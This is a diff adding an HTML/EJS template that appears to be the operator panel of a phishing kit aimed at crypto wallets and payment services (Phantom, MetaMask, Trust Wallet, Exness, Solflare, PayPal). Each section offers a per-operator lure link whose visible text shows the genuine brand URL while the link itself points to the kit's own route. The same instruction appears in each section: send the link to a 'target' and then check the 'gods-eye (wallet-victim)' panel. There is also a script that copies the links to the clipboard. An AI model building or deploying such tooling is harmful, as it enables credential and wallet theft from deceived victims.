@@ -1,0 +1,146 @@
+<div class="content-inner">
+
+    <!-- THIS IS FOR PHANTOM -->
+    <div class="phantom">
+        <div class="icon">
+            <img src="/uploads/phantom.png" alt="exness" width="35%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/phantom?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/phantom?userId=<%= userId %>">https://www.phantom.app</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+    <!-- THIS IS FOR META MASK -->
+    <div class="metamask">
+        <div class="icon">
+            <i class="fa-brands fa-ethereum"></i> <!-- Add an icon representing MetaMask -->
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/metamask?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/metamask?userId=<%= userId %>">https://www.metamask.io</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+    <!-- THIS IS FOR TRUST WALLET -->
+    <div class="trustwallet">
+        <div class="icon">
+            <img src="/uploads/trustwallet.png" alt="exness" width="60%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/trustwallet?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/trustwallet?userId=<%= userId %>">https://www.trustwallet.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+    <!-- THIS IS FOR EXNESS -->
+    <div class="exness">
+        <div class="icon">
+            <img src="/uploads/exness.png" alt="exness" width="40%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/exness?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/exness?userId=<%= userId %>">https://www.exness.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+
+    <!-- THIS IS FOR SOLFLARE -->
+    <div class="solflare">
+        <div class="icon">
+            <img src="/uploads/solflare.png" alt="exness" width="35%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/solflare?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/solflare?userId=<%= userId %>">https://www.solflare.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+
+    <!-- THIS IS FOR PAYPAL -->
+    <div class="paypal">
+        <div class="icon">
+            <i class="fa-brands fa-paypal"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/paypal?userId=<%= userId %>')">
+                <i class="ri-file-copy-line"></i> COPY
+            </button>
+            <a href="/paypal?userId=<%= userId %>">https://www.paypal.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (wallet-victim).</p>
+    </div>
+
+
+
+
+
+
+
+
+</div>
+<script>
+    function copyURL(route) {
+        const url = window.location.origin + route;
+        navigator.clipboard.writeText(url).then(() => {
+            Toastify({
+                text: "URL copied to clipboard!",
+                duration: 3000,
+                close: true,
+                gravity: "top", // "top" or "bottom"
+                position: "center", // "left", "center" or "right"
+                backgroundColor: "linear-gradient(to right, #00b09b, #96c93d)",
+                stopOnFocus: true,
+            }).showToast();
+        }).catch(err => {
+            console.error('Failed to copy URL:', err);
+            Toastify({
+                text: "Failed to copy!",
+                duration: 5000,
+                close: true,
+                gravity: "top",
+                position: "center",
+                backgroundColor: "#ff5c5c",
+                stopOnFocus: true,
+            }).showToast();
+        });
+    }
+    </script>
+    
